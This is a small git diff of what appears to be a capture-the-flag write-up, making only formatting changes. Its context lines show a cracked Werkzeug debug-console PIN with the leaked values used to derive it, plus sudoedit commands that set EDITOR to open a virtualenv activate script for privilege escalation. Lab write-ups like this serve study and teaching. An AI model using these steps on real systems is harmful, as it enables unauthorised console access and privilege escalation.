@@ -245,7 +245,6 @@ python3 ./pin_cracker.py
 116-841-486
 ('www-data', 'flask.app', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py', '345052381550', 'ed5b159560f54721827644bc9b220d00superpass.service')
 ==========================================================================
-
 ```
 
 And it worked!! The console is ready to go:
@@ -369,7 +368,7 @@ edwards@agile://$ ls -lh /app/venv/bin/activate
 
 So the group `dev_admin` can write the `activate`.
 
-```
+```bash
 #exploit as edwards
 export EDITOR="vim -p /app/venv/bin/activate"
 sudo -u dev_admin sudoedit /app/config_test.json
